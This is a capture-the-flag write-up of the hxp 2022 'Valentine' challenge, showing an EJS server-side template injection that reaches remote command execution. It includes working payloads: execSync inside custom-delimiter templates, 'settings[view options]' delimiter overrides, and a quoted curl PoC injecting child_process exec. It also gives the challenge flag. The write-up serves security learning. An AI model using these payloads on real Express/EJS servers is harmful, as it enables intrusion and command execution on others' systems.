---
Category:
  - Web
Difficulty: Easy
Platform: hxp
Status: 3. Complete
tags: [Express, ejs, OAST, SSTI, RCE]
---

# Introduction and setup

>[!quote]
>Create an awesome template for your valentine and share it with the world!

Valentine is an easy-difficulty web challenge from the hxp 2022 CTF where we can *create an awesome template for our valentine and share it with the world*.

The site provides us an archive containing the application source code as well as Docker compose file to reproduce the environment locally, and it provides also two IPs hosting the actual challenge, that however are no longer working since the CTF has finished.

- Download: https://2022.ctf.link/assets/files/valentine-9455b10a15fc5519.tar.xz
- Server: http://91.107.238.232:9086/

```bash
┌──(kali㉿kali)-[~/YT]
└─$ tree
.
├── valentine
│   ├── app.js
│   ├── docker-compose.yml
│   ├── Dockerfile
│   ├── flag.txt
│   ├── index.html
│   ├── package.json
│   ├── package-lock.json
│   └── readflag
└── valentine-9455b10a15fc5519.tar.xz

2 directories, 9 files

```

Because we have a ready-to-go docker-compose file we can start building the environment while taking a deeper look at the files contained inside the archive.

```bash
┌──(kali㉿kali)-[~/YT/valentine]
└─$ sudo docker compose up
```

# Information Gathering

## Files and configurations review

Taking a look at the `Dockerfile`, we can immediately notice that the application is using NodeJS, it is exposing port 3000, and that the `flag.txt` file is located inside the root folder alongside the `/readflag` binary, which probably must be used to obtain the flag. 

```Dockerfile
# see docker-compose.yml

FROM node:current-bullseye
ENV NODE_ENV=production
WORKDIR /app

COPY package.json package-lock.json app.js index.html /app/
COPY flag.txt readflag /
RUN npm install

RUN mkdir views
RUN chown node:node views

RUN chown root:root /flag.txt && chmod 400 /flag.txt
RUN chown root:root /readflag && chmod 4555 /readflag

EXPOSE 3000

USER node
CMD node app.js
```

The `docker-compose.yml` does not provide us with much info, it simply binds port 9086 to port 3000:

```yml
version: "3"
services:

  chall:
    build:
      dockerfile: Dockerfile

    restart: always
    ports:
      - 9086:3000
```

On the other hand, the `package.json` file is very interesting: it tells us that the application entry point is the `app.js` file, but even more interesting, it shows us that the application is using `express` and `ejs`, a simple templating language that lets you generate HTML markup with plain JavaScript:

```json
{
  "name": "valentine",
  "version": "1.0.0",
  "description": "Create a valentine's card for your loved one",
  "main": "app.js",
  "author": "sandr0",
  "license": "MIT",
  "dependencies": {
    "ejs": "^3.1.8",
    "express": "^4.18.2"
  }
}
```

The `index.html` and `app.js` files are the core of the application, but we will inspect them later after having taken an active look at the actual challenge:

```js
// app.js
var express = require('express');
var bodyParser = require('body-parser')
const crypto = require("crypto");
var path = require('path');
const fs = require('fs');

var app = express();
viewsFolder = path.join(__dirname, 'views');

if (!fs.existsSync(viewsFolder)) {
  fs.mkdirSync(viewsFolder);
}

app.set('views', viewsFolder);
app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({ extended: false }))

app.post('/template', function(req, res) {
  let tmpl = req.body.tmpl;
  let i = -1;
  console.log("tmpl:"+tmpl)
  while((i = tmpl.indexOf("<%", i+1)) >= 0) {
    console.log("i: "+ i + " - " +tmpl.substring(i, i+11));
    if (tmpl.substring(i, i+11) !== "<%= name %>") {
      res.status(400).send({message:"Only '<%= name %>' is allowed."});
      return;
    }
  }
  console.log("Bypassed!")
  let uuid;
  do {
    uuid = crypto.randomUUID();
  } while (fs.existsSync(`views/${uuid}.ejs`))

  try {
    fs.writeFileSync(`views/${uuid}.ejs`, tmpl);
  } catch(err) {
    console.log(err);
    res.status(500).send("Failed to write Valentine's card");
    return;
  }
  let name = req.body.name ?? '';
  return res.redirect(`/${uuid}?name=${name}`);
});

app.get('/:template', function(req, res) {
  let query = req.query;
  let template = req.params.template
  if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {
    res.status(400).send("Not a valid card id")
    return;
  }
  if (!fs.existsSync(`views/${template}.ejs`)) {
    res.status(400).send('Valentine\'s card does not exist')
    return;
  }
  if (!query['name']) {
    query['name'] = ''
  }
  console.log("name: "+query['name']);
  console.log(query);
  return res.render(template, query);
});

app.get('/', function(req, res) {
  return res.sendFile('./index.html', {root: __dirname});
});

app.listen(process.env.PORT || 3000); 
```

Perfect! At this point, the docker environment should be ready. We can browse localhost on port 9086 and give a closer look at the application.

## The application at-a-glance 🔍

The index page generates a basic HTML template that we can customize. At the bottom of the page, we can insert a name that will be inserted inside the template instead of the `<%= name %>` placeholder:

![](../../zzz_res/attachments/valentine1.png)

Proxying the traffic through Burpsuite, we can see that the template's code is passed to the server inside the `tmpl` field alongside the specified name. Then the "name" 
placeholder is replaced with the user-provided input, and the resulting output is shown onscreen.

```http
POST /template
Host: 127.0.0.1:9086
Content-Type: application/x-www-form-urlencoded
...

tmpl=<%= name %>&name=0xbro
```

![](../../zzz_res/attachments/valentine2.png)

All the evidence points in the direction of a Server Side Template Injection vulnerability, but if we try to inject some math or some basic payloads, they are not evaluated but instead are reflected as they are. We can try to add other placeholders having different names, but they all get rejected by the backend.

![](../../zzz_res/attachments/valentine3.png)

If we want to add some other payload different from the original placeholder, we have to find a bypass to the security checks implemented by the application. To do that, we must give a closer look at the application source code, and luckily for us, we have everything we need.

## Source code review

As I said before, the `app.js` file is the application's core. Scrolling through the source code, we can notice that the challenge uses `ejs` to manage views and that those views are stored inside the `/views` folder with a random uuid as the file name.

```js
var express = require('express');
var bodyParser = require('body-parser')
const crypto = require("crypto");
var path = require('path');
const fs = require('fs');

var app = express();
viewsFolder = path.join(__dirname, 'views');

if (!fs.existsSync(viewsFolder)) {
  fs.mkdirSync(viewsFolder);
}

app.set('views', viewsFolder);
app.set('view engine', 'ejs');

...

let uuid;
  do {
    uuid = crypto.randomUUID();
  } while (fs.existsSync(`views/${uuid}.ejs`))

  try {
    fs.writeFileSync(`views/${uuid}.ejs`, tmpl);
  } catch(err) {
    res.status(500).send("Failed to write Valentine's card");
    return;
  }
});
```

The content of those views, which are nothing more than template files, is copied from the `tmpl` body field, but before writing it inside the view file, the server checks for any placeholder different from the default one. If it finds a different value, it prints out the error message we saw before; otherwise, it writes `tmpl` inside the new view and then redirects us to that file.

```js
app.post('/template', function(req, res) {
  let tmpl = req.body.tmpl;
  let i = -1;
  while((i = tmpl.indexOf("<%", i+1)) >= 0) {
    if (tmpl.substring(i, i+11) !== "<%= name %>") {
      res.status(400).send({message:"Only '<%= name %>' is allowed."});
      return;
    }
  }
  
  ...

  let name = req.body.name ?? '';
  return res.redirect(`/${uuid}?name=${name}`);
```

When we request a template file, the function verifies if the card has a valid code and exists, and if there were no problems, it renders the template using the data passed through the query string.

```js
app.get('/:template', function(req, res) {
  let query = req.query;
  let template = req.params.template
  if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {
    res.status(400).send("Not a valid card id")
    return;
  }
  if (!fs.existsSync(`views/${template}.ejs`)) {
    res.status(400).send('Valentine\'s card does not exist')
    return;
  }
  if (!query['name']) {
    query['name'] = ''
  }
  return res.render(template, query);
});
```

Ok, so... where is the bug?

# Exploitation

To investigate the issue with a better perspective, I added inside the source code some debug print statements that show us the state of the user-supplied input before any key function. Then I rebuilt the docker image and started playing around with the parameters we can use.

## substring() bypass

Our first effort was trying to bypass the security controls imposed by the server and be able to write arbitrary data inside a template.

One of my teammates noticed that by inserting twice the `tmpl` field inside the HTTP body, it was possible to pass to the server an array instead of a string, completely bypassing the security checks performed using the `substring()` method.

>[!bug] 
>`Substring()` is part of the `string` prototype and can be used only on `string` variables. In our case, however, we can pass to the method an `array`, forcing the `if` condition to result always `false`.

PoC:

```js
var tmpl = [ '<%= asd %>', '<%= asd %>' ]
var i
while((i = tmpl.indexOf("<%", i+1)) >= 0) {
    if (tmpl.substring(i, i+11) !== "<%= name %>") {
      res.status(400).send({message:"Only '<%= name %>' is allowed."});
	  console.log('Caught!')
      return;
    }
  }
console.log('bypassed')
```

![](../../zzz_res/attachments/valentine4.png)

HTTP request: 
```http
POST /template
Host: 127.0.0.1:9086
Content-Type: application/x-www-form-urlencoded

tmpl=<%= name %>&tmpl=<%= name %>
```

Server response:
```http
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 32
ETag: W/"20-AGcAsG/itS23B2siUG6nl7RRo0A"
Date: Fri, 10 Mar 2023 20:27:20 GMT
Connection: close

Failed to write Valentine's card
```

Server logs:
```
```js
[ '<%= name %>', '<%= name %>' ]
TypeError [ERR_INVALID_ARG_TYPE]: The "data" argument must be of type string or an instance of Buffer, TypedArray, or DataView. Received an instance of Array
    at Object.writeFileSync (node:fs:2222:5)
    at /app/app.js:36:8
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
    at next (/app/node_modules/express/lib/router/index.js:280:10)
    at /app/node_modules/body-parser/lib/read.js:137:5 {
  code: 'ERR_INVALID_ARG_TYPE
```

Unfortunately, we were unable to proceed further because we required an instance of Buffer, TypedArray, or DataView instead of an Array, so we moved further, looking for some other bugs.


## SSTI using EJS custom delimiters 

Using the same logic, I tried passing to the template some non-string parameters, noticing that we weren't limited to using only string values, but we were also able to pass arrays or objects to the server.

```http
GET /991a04f8-fecd-42f9-af93-31d29f13420c?name[root]=/tmp&name[foo]=pippo
Host: 127.0.0.1:9086


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 15
ETag: W/"f-wdRP8Dr/E3KFbCgYVPRU4uHRW3w"
Date: Fri, 10 Mar 2023 20:19:12 GMT
Connection: close

[object Object]
```

```txt
[+] Log: { root: '/tmp', foo: 'pippo' }
```

With that in mind, we started looking at the EJS documentation and older vulnerabilities, searching for clues to proceed further.

The official EJS documentation [^1] pointed us to some very interesting **options** and **features**. Among them, the one that made our curiosity clicks was the support for **custom delimiters**.

[^1]: https://ejs.co/#docs 

![](../../zzz_res/attachments/valentine5.png)

Among the various options supported by EJS, some of them allow **overwriting the characters used** by the template **as the delimiters**. 
>[!attention]
>If we manage to pass those values to the render method, **we can set a completely different placeholder** that will pass all the security checks, remaining however a valid template variable.

The EJS's render methods [^2] accepts those options as a third argument, but the render method used by the application is the one defined inside Express [^3], which accepts a `locals` object as a second argument and which later calls the EJS's `renderFile()` method.

[^2]: https://ejs.co/#docs
[^3]: https://expressjs.com/en/api.html#res.render

Keeping in mind that the challenge passes a full user-controllable variable to the render method and that we already discovered that we can also pass objects instead of strings to the server, this path seems promising.

The final clue arrives from different articles related to some older EJS vulnerabilities.

### Old vulnerabilities

This Snyk's article from 2016 [^4] shows that options and data can be passed together using the same object. 

```js
ejs.renderFile('my-template', {root:'/bad/root/'}, callback);
```

This feature is also confirmed inside the official EJS documentation [^5], but it will not work anymore for unsafe options like the one shown by Snyk.  

```js
app.get('/', (req, res) => {
  res.render('index', {foo: 'FOO', delimiter: '?'});
});
```

We can try passing some options as separate fields or even as object properties, but it doesn't produce any result.

>[!danger]- Spoiler
>You can read why it didn't work at the chapter [Cache and custom delimiters](valentine.md#Cache%20and%20custom%20delimiters)

[^4]: https://snyk.io/blog/fixing-ejs-rce-vuln/
[^5]: https://github.com/mde/ejs/wiki/Using-EJS-with-Express#passing-opts-with-data

![](../../zzz_res/attachments/valentine6.png)

This other article from the GitHub security lab [^6] completely caught my attention. It talks about an RCE vulnerability in EJS, and the vulnerable code used as a sample has the same features as our challenge. The PoC provided is also very similar to the one we were creating, but it was created for EJS 3.1.5, while the version we are using is the 3.1.8.

```js
const express = require('express')
const app = express()
const port = 3000
 
app.set('views', __dirname);
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: false }));
app.get('/', (req, res) => {
   res.render('index', req.query)
})
 
app.listen(port, () => { })
module.exports = app;
```

Proof of concept should create a file via touch named /tmp/GHSLPayload:

```bash
curl 'http://localhost:3000/?message=foo&settings\[view%20options\]\[outputFunctionName\]=x%3Bprocess.mainModule.require(%27child_process%27).exec(%27bash%20-c%20%22touch%20%2Ftmp%2FGHSLPayload%22%27)%3Bx'
```

[^6]: https://securitylab.github.com/advisories/GHSL-2021-021-tj-ejs/

If we try the PoC against our server it doesn't work, but it is still a great indicator that we are close to the solution.

### Undocumented EJS shallowCopy

The final illumination comes from this EJS Server Side Template Injection writeup [^7] which exploited prototype pollution in the library.

[^7]: https://eslam.io/posts/ejs-server-side-template-injection-rce/

The article digs down into the EJS source code, showing why the `data` and the `options` are merged, but most importantly, pointing us to an **old undocumented feature** that we can still use in the later version: the `view options`.

```js
var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
  'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
...
exports.render = function (template, d, o) {
  var data = d || {};
  var opts = o || {};

  // No options object -- if there are optiony names
  // in the data, copy them to options
  if (arguments.length == 2) {
    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
  }

  return handleCache(opts, template)(data);
};
...
exports.renderFile = function () {
	...
	// Undocumented after Express 2, but still usable, esp. for
	// items that are unsafe to be passed along with data, like `root`
	viewOpts = data.settings['view options'];
	if (viewOpts) {
	    utils.shallowCopy(opts, viewOpts);
	}
...
```

Migrating from Express 2.x to 3.x [^8], the `view options` mutated into `app.locals`, but was not removed from the source code!

[^8]: https://github.com/expressjs/express/wiki/Migrating-from-2.x-to-3.x

>[!bug] Undocumented dangerous shallowCopy
>By calling the `renderFile` function and passing a single object containing a `settings` property containing itself the `view options` property, we can bypass the `_OPTS_PASSABLE_WITH_DATA` filter and overwrite all the properties we want.

At this point, we can create a template that uses custom delimiters containing a simple command execution, so that the `while` loop searching for the single allowed placeholder is bypassed:

```http
POST /template
Host: 127.0.0.1:9086
Content-Type: application/x-www-form-urlencoded

tmpl=foo [.= process.mainModule.require('child_process').execSync('echo pippo').toString() .] bar&name=asd
```

![](../../zzz_res/attachments/valentine7.png)

Then we can request that template passing the `settings[view options]` fields with the new desired delimiters:

```http
GET /991a04f8-fecd-42f9-af93-31d29f13420c?name=asd&settings[view%20options][delimiter]=%2e&settings[view%20options][openDelimiter]=%5b&settings[view%20options][closeDelimiter]=%5d
Host: 127.0.0.1:9086
```

![](../../zzz_res/attachments/valentine8.png)

Finally we did it! We have remote command execution and we can exfiltrate the flag, either by showing it on the screen, or by using OAST techniques.

![](../../zzz_res/attachments/valentine9.png)
![](../../zzz_res/attachments/valentine10.png)

## Cache and custom delimiters

The intended solution [^9] was not so different from the one we adopted, and to be honest, we came across it but didn't get it because of a simple but dangerous error.  

During the analysis, we did not consider that the server was configured to run in production mode and that Express, therefore, had caching enabled.

Dockerfile:
```Dockerfile
ENV NODE_ENV=production
```

Express.js:
```js
if (env === 'production') {
  this.enable('view cache');
}
```

[^9]: https://hxp.io/blog/101/hxp-CTF-2022-valentine/

When we sent the custom delimiter in the query string, we didn't get back any valid result because **the server had already cached the view with the un-modified delimiter** since the first time we requested the template. If we try passing the delimiter field **the first time we access the template**, we obtain the same result achieved using the view options element.

Template:
![](../../zzz_res/attachments/valentine11.png)

Request intercepted before visiting the first time the view:
```http
GET /991a04f8-fecd-42f9-af93-31d29f13420c?name=maoutis&delimiter=.
Host: 127.0.0.1:9086
```
![](../../zzz_res/attachments/valentine12.png)

We overcomplicated the challenge, but it was a nice journey.

# Flag

>[!success] Flag
> `hxp{W1ll_u_b3_my_V4l3nt1ne?}`

